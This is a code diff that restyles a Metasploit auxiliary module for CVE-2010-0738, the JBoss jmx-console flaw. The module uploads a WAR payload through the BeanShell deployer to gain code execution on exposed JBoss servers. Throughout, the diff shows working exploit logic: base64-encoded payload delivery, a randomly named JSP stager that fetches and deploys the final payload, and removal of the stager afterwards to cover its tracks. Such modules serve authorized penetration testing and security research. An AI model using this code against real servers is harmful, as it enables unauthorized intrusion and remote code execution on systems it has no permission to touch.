@@ -8,57 +8,55 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'          => 'JBoss JMX Console Beanshell Deployer WAR Upload and Deployment',
-      'Description'   => %q{
+      'Name' => 'JBoss JMX Console Beanshell Deployer WAR Upload and Deployment',
+      'Description' => %q{
         This module can be used to install a WAR file payload on JBoss servers that have
         an exposed "jmx-console" application. The payload is put on the server by
         using the jboss.system:BSHDeployer's createScriptDeployment() method.
       },
-      'Author'        =>
-        [
-          'us3r777 <us3r777[at]n0b0.so>'
-        ],
-      'References'    =>
-        [
-          [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST
-          [ 'OSVDB', '64171' ],
-          [ 'URL', 'https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now' ],
-          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ]
-        ],
-      'Actions'       =>
-        [
-          ['Deploy', 'Description' => 'Create and deploy app (WAR) to deliver payload'],
-          ['Undeploy', 'Description' => 'Remove app (WAR) for cleanup']
-        ],
+      'Author' => [
+        'us3r777 <us3r777[at]n0b0.so>'
+      ],
+      'References' => [
+        [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST
+        [ 'OSVDB', '64171' ],
+        [ 'URL', 'https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now' ],
+        [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ]
+      ],
+      'Actions' => [
+        ['Deploy', { 'Description' => 'Create and deploy app (WAR) to deliver payload' }],
+        ['Undeploy', { 'Description' => 'Remove app (WAR) for cleanup' }]
+      ],
       'DefaultAction' => 'Deploy',
-      'License'       => BSD_LICENSE,
+      'License' => BSD_LICENSE,
     )
 
     register_options(
       [
         Opt::RPORT(8080),
-        OptString.new('APPBASE',    [ true,  'Application base name', 'payload']),
-        OptPath.new('WARFILE',      [ false, 'The WAR file to deploy'])
-      ])
+        OptString.new('APPBASE', [ true, 'Application base name', 'payload']),
+        OptPath.new('WARFILE', [ false, 'The WAR file to deploy'])
+      ]
+    )
   end
 
   def deploy_action(app_base, war_data)
     encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
 
     if http_verb == 'POST'
-      print_status("Deploying payload...")
+      print_status('Deploying payload...')
       opts = {
-        :file => "#{app_base}.war",
-        :contents => encoded_payload
+        file: "#{app_base}.war",
+        contents: encoded_payload
       }
     else
-      print_status("Deploying stager...")
-      stager_name = Rex::Text.rand_text_alpha(8 + rand(8))
+      print_status('Deploying stager...')
+      stager_name = Rex::Text.rand_text_alpha(rand(8..15))
       stager_contents = stager_jsp(app_base)
       opts = {
-        :dir => "#{stager_name}.war",
-        :file => "#{stager_name}.war/#{stager_name}.jsp",
-        :contents => Rex::Text.encode_base64(stager_contents).gsub(/\n/, '')
+        dir: "#{stager_name}.war",
+        file: "#{stager_name}.war/#{stager_name}.jsp",
+        contents: Rex::Text.encode_base64(stager_contents).gsub(/\n/, '')
       }
     end
 
@@ -66,40 +64,39 @@ class MetasploitModule < Msf::Auxiliary
     package = deploy_bsh(bsh_payload)
 
     if package.nil?
-      print_error("Deployment failed")
+      print_error('Deployment failed')
       return
     else
-      print_good("Deployment successful")
+      print_good('Deployment successful')
     end
 
     unless http_verb == 'POST'
       # call the stager to deploy our real payload war
       stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'
-      payload_data = "#{Rex::Text.rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
+      payload_data = "#{Rex::Text.rand_text_alpha(rand(8..15))}=#{Rex::Text.uri_encode(encoded_payload)}"
       print_status("Calling stager #{stager_uri} to deploy final payload...")
       res = deploy('method' => 'POST',
-                   'data'   => payload_data,
-                   'uri'    => stager_uri)
+                   'data' => payload_data,
+                   'uri' => stager_uri)
       if res && res.code == 200
-        print_good("Payload deployed")
+        print_good('Payload deployed')
       else
-        print_error("Failed to deploy final payload")
+        print_error('Failed to deploy final payload')
       end
 
       # Remove the stager
-      print_status("Removing stager...")
+      print_status('Removing stager...')
       files = {}
       files[:stager_jsp_name] = "#{stager_name}.war/#{stager_name}.jsp"
       files[:stager_base] = "#{stager_name}.war"
       delete_script = generate_bsh(:delete, files)
       res = deploy_package(delete_script, package)
       if res.nil?
-        print_error("Unable to remove Stager")
+        print_error('Unable to remove Stager')
       else
-        print_good("Stager successfully removed")
+        print_good('Stager successfully removed')
       end
     end
-
   end
 
   def undeploy_action(app_base)
@@ -112,9 +109,9 @@ class MetasploitModule < Msf::Auxiliary
 
     package = deploy_bsh(delete_script)
     if package.nil?
-      print_error("Unable to remove WAR")
+      print_error('Unable to remove WAR')
     else
-      print_good("Successfully removed")
+      print_good('Successfully removed')
     end
   end
 
@@ -124,7 +121,7 @@ class MetasploitModule < Msf::Auxiliary
     case action.name
     when 'Deploy'
       unless datastore['WARFILE'] && File.exist?(datastore['WARFILE'])
-        print_error("WAR file not found")
+        print_error('WAR file not found')
         return
       end
       war_data = File.read(datastore['WARFILE'], mode: 'rb')
